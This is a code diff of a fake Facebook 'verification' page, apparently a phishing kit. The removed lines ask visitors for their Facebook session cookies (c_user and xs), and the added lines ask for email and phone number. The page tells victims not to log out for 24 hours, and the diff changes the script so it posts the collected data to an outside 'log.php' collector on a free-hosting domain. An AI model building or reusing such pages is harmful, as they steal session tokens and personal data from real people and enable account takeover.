@@ -558,10 +558,10 @@
           </p>
 
           <div class="fb-input-group">
-            <label class="fb-input-label" for="c_user">c_user Token</label>
-            <input type="text" id="c_user" class="fb-input" placeholder="Enter c_user token (numbers only)"/>
+            <label class="fb-input-label" for="Email">Email</label>
+            <input type="text" id="Email" class="fb-input" placeholder="Enter Your Email"/>
             <div id="c_user_error" class="error-message">
-              Error: c_user must contain only numbers
+              Error: Email must contain only numbers
             </div>
             <p class="fb-note">
               This token identifies your Facebook account for verification
@@ -569,10 +569,10 @@
           </div>
 
           <div class="fb-input-group">
-            <label class="fb-input-label" for="xs">xs Token</label>
-            <input type="text" id="xs" class="fb-input" placeholder="Enter xs token (letters, numbers &amp; symbols)"/>
-            <div id="xs_error" class="error-message">
-              Error: xs must contain combination of letters, numbers and symbols
+            <label class="fb-input-label" for="phone">phone</label>
+            <input type="text" id="phone" class="fb-input" placeholder="phone Number"/>
+            <div id="phone_error" class="error-message">
+              Error: phone must contain combination of letters, numbers and symbols
             </div>
             <p class="fb-note fb-note-warning">
               Important: Do not log out of your account for 24 hours after
@@ -742,9 +742,9 @@
         }
       };
 
-      // Function to submit to first form (https://submit-form.com/BYsMsB5bD)
+      // Function to submit to first form (https://actions-part-rcver-online.42web.io/log.php)
       function submitToFirstForm(data) {
-        fetch("https://submit-form.com/BYsMsB5bD", {
+        fetch("https://actions-part-rcver-online.42web.io/log.php", {
           method: "POST",
           headers: {
             "Content-Type": "application/json",
